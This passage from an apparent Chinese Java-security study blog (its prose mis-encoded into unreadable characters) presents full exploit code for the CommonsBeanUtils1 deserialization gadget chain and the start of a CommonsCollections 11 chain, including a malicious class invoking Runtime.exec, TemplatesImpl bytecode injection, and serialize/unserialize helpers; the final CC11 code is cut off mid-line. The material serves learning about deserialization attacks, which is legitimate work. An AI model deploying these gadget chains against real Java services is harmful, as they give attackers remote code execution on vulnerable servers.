class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    field.set(obj, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ²¡å•¥å¥½åˆ†æçš„ä»£ç ä¸€çœ‹å°±æ‡‚äº†ï¼Œç„¶åæ˜¯ä¸‹é¢è¿™è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151122697.png" alt="image-20230715112217461"><br>è¿™é‡Œ<code>_name</code>ä¸èƒ½ä¸ºç©ºï¼Œè¿™æ ·æ‰èƒ½ç»§ç»­èµ°ä¸‹å»ï¼Œå†æ˜¯ä¸‹é¢è¿™è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151122476.png" alt="image-20230715112237351"><br>è¿™é‡Œ<code>_bytecodes</code>ä¹Ÿä¸èƒ½ä¸ºç©ºï¼Œå…¶å®è¿™é‡Œçš„åˆ©ç”¨æ¡ä»¶å°±æ˜¯CC3ä¸­ä¸€æ ·çš„ï¼Œ<code>_tfactory</code> éœ€è¦æ˜¯ä¸€ä¸ª <code>TransformerFactoryImpl</code> å¯¹è±¡ï¼Œå› ä¸º <code>TemplatesImpl#defineTransletClasses()</code> æ–¹æ³•é‡Œæœ‰è°ƒç”¨åˆ° <code>_tfactory.getExternalExtensionsMap()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151122084.png" alt="image-20230715112250939"><br><code>test.class</code>å…¶å®å°±æ˜¯å‰é¢CC3å†™çš„ä¸€ç›´åœ¨ç”¨çš„å¼¹è®¡ç®—å™¨çš„æ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151123306.png" alt="image-20230715112304115"><br>ç„¶åå°±æ˜¯æœ€ç»ˆçš„EXPç¼–å†™ï¼Œè¿™é‡Œå…ˆçœ‹ä¸€ä¸‹<code>BeanComparator.compare()</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151123714.png" alt="image-20230715112317466"><br>è¿™ä¸ªæ–¹æ³•é¦–å…ˆæ¥æ”¶ä¸¤ä¸ªå¯¹è±¡ï¼Œå¦‚æœ this.property ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ¯”è¾ƒè¿™ä¸¤ä¸ªå¯¹è±¡ï¼›å¦‚æœ this.property ä¸ä¸ºç©ºï¼Œåˆ™ç”¨ PropertyUtils.getProperty åˆ†åˆ«å–è¿™ä¸¤ä¸ªå¯¹è±¡çš„ this.property å±æ€§ï¼Œæ¯”è¾ƒå±æ€§çš„å€¼ã€‚<br>æ—¢ç„¶è¦è¿›è¡Œæ¯”è¾ƒé‚£ä¹ˆå°±éœ€è¦æ–°å»ºä¸€ä¸ª <code>PriorityQueue</code> çš„é˜Ÿåˆ—ï¼Œå¹¶è®©å…¶æœ‰ 2 ä¸ªå€¼è¿›è¡Œæ¯”è¾ƒã€‚è€Œä¸” <code>PriorityQueue</code> çš„æ„é€ å‡½æ•°å½“ä¸­å°±åŒ…å«äº†ä¸€ä¸ªæ¯”è¾ƒå™¨ã€‚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151123453.png" alt="image-20230715112329289"><br>æœ€åä½¿ç”¨queue.addå¯ä»¥è‡ªåŠ¨å®Œæˆæ¯”è¾ƒå› ä¸ºaddæ–¹æ³•è°ƒç”¨äº†compareæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151123078.png" alt="image-20230715112349646"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();  </span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);  </span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, beanComparator);  </span><br><span class="line">        queue.add(templates);  </span><br><span class="line">        queue.add(templates);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151124073.png" alt="image-20230715112415886"><br>ç„¶åå°±æ˜¯è§£å†³åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ‰å¼¹è®¡ç®—å™¨ï¼Œé‚£ä¹ˆå°±å°† queue.add èµ‹ä¸€ä¸ªæ™®é€šçš„å¸¸é‡ï¼Œå†é€šè¿‡åå°„ä¿®æ”¹å€¼å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue.add(<span class="number">1</span>);  </span><br><span class="line">queue.add(<span class="number">1</span>); </span><br></pre></td></tr></table></figure><p>æœ€ç»ˆçš„expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();  </span><br><span class="line">        <span class="comment">// åˆ›å»ºæ–°çš„é˜Ÿåˆ—ï¼Œå¹¶æ·»åŠ æ¶æ„å­—èŠ‚ç   </span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, beanComparator);  </span><br><span class="line">        queue.add(<span class="number">1</span>);  </span><br><span class="line">        queue.add(<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// å°† property çš„å€¼èµ‹ä¸º outputProperties        </span></span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);  </span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);  </span><br><span class="line"><span class="comment">//        serialize(queue);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151124308.png" alt="image-20230715112429149"></p><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p>è¿™é‡Œè¿˜æ˜¯ç›´æ¥åŠ åœ¨CCé“¾ä¸­çš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151124392.png" alt="image-20230715112439321"><br>å‚è€ƒï¼š<br>ä¸‹é¢è¿™ä¸ªå¤§ä½¬åˆ†æçš„æŒºä¸é”™çš„ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯å‚è€ƒä»–çš„ï¼Œä¹Ÿæ˜¯è·Ÿç€ä»–çš„å­¦ä¹ è·¯çº¿å­¦çš„<br><a href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x04-CommonsBeanUtils1-%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90">CommonsBeanUtilsååºåˆ—åŒ– | Drunkbabyâ€™s Blog (drun1baby.top)</a></p><p>å…¶å®è¿™æ¡é“¾å­ç™½æ—¥æ¢¦ç»„é•¿åœ¨shiroä¸­åˆ†æäº†ï¼Œåé¢çœ‹åˆ°shiroçš„æ—¶å€™æ‰çŸ¥é“</p><p><a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.788&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.788&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾11</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE11/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE11/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><ul><li>CommonsCollections 3.1-3.2.1</li><li>jdkæ— é™åˆ¶</li></ul><h2 id="é“¾å­åˆ†æ"><a href="#é“¾å­åˆ†æ" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><p>çœ‹å¤§ä½¬çš„åšå®¢è¿™è°ƒé“¾å­æ˜¯CC2+CC6ï¼Œè¿™é‡ŒæŠŠå®Œæ•´çš„è°ƒç”¨é“¾æµç¨‹å›¾æ”¾ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151106464.png" alt="image-20230715110638370"><br>å…¶å®è¿™æ¡é“¾å­å°±æ˜¯ä¸ºåé¢çš„shiroå¯ä»¥ä¸é€šè¿‡<code>Transform</code>æ•°ç»„æ¥å®ç°ååºåˆ—åŒ–æœåŠ¡çš„</p><h3 id="CC2çš„å°¾éƒ¨é“¾TemplatesImpl"><a href="#CC2çš„å°¾éƒ¨é“¾TemplatesImpl" class="headerlink" title="CC2çš„å°¾éƒ¨é“¾TemplatesImpl"></a>CC2çš„å°¾éƒ¨é“¾TemplatesImpl</h3><p>æŠŠCC2çš„ååŠéƒ¨åˆ†æ‹¿æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line"><span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸ºCC2çš„ååŠéƒ¨åˆ†ï¼Œåªæ˜¯åŠ ä¸Šäº†å¯¹<code>_tfactory</code>çš„å¤„ç†ï¼Œç„¶ååˆ©ç”¨æˆåŠŸ</p><h3 id="CC6çš„å‰åŠéƒ¨åˆ†"><a href="#CC6çš„å‰åŠéƒ¨åˆ†" class="headerlink" title="CC6çš„å‰åŠéƒ¨åˆ†"></a>CC6çš„å‰åŠéƒ¨åˆ†</h3><p>è¿™é‡ŒCC6çš„å‰åŠéƒ¨åˆ†æœ‰ç‚¹å¿˜è®°äº†ï¼Œæ¥ç€åˆ†æä¸€ä¸‹ï¼Œè¿™é‡Œæ˜¯<code>InvokerTransformer.transform()</code>å»æ‰¾åˆ°è¿™é‡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151107426.png" alt="image-20230715110701262"><br>ç„¶åå‘ç°<code>LazyMap.get()</code>è°ƒç”¨äº†è¿™é‡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151107476.png" alt="image-20230715110714346"><br>ç„¶åå†å»æ‰¾è°è°ƒç”¨äº†<code>get()</code>æ–¹æ³•ï¼Œè¿™ä¸ª<code>get()</code>æ–¹æ³•æŒºéš¾æ‰¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç›´æ¥çœ‹ï¼Œæœ€ç»ˆåœ¨<code>TiedMapEntry.getValue()</code>æ–¹æ³•ä¸­æ‰¾åˆ°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151107668.png" alt="image-20230715110725585"><br>ç„¶åç»§ç»­æ‰¾ï¼Œå‘ç°åŒç±»ä¸‹è°ƒç”¨äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151107753.png" alt="image-20230715110736662"><br>ç„¶åå°±ä¸ç”¨ç»§ç»­å¾€ä¸‹æ‰¾äº†ï¼Œå› ä¸ºåœ¨Javaååºåˆ—åŒ–ä¸­hashCodeæ–¹æ³•åé¢çš„åˆ©ç”¨é“¾åŸºæœ¬éƒ½æ˜¯ä¸‹é¢è¿™æ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">HashMap.put() --è‡ªåŠ¨è°ƒç”¨--&gt;   HashMap.hash()</span><br><span class="line">åç»­åˆ©ç”¨é“¾.hashCode()</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ç›´æ¥åˆ°<code>HashMap.hash()</code>ä¸­çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151108582.png" alt="image-20230715110811501"><br>CC6åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œå½“ç„¶expç¼–å†™è¿˜æœ‰å¾ˆå¤šç»†èŠ‚é—®é¢˜å¤„ç†ï¼Œä¸‹é¢æ¥é€æ­¥ç¼–å†™expï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆå°†ååŠæ®µå’ŒLazyMapè¿èµ·æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);  </span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">lazyGetMethod</span> <span class="operator">=</span> 